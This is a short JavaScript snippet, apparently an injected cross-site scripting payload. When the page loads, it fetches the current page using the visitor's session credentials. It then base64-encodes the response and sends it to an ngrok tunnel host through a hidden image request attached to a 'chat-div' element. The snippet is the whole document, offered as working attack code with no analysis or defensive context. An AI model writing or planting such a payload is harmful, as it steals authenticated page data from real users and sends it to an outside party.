window.addEventListener('load', function () {
 function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://392445a8.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}


  fetch(window.location.pathname,
        {
   credentials: "same-origin"
  })
  .then(res => {
      return res.text();
  })
  .then(data => {
  send2server("settings", data);

  });
  
    })
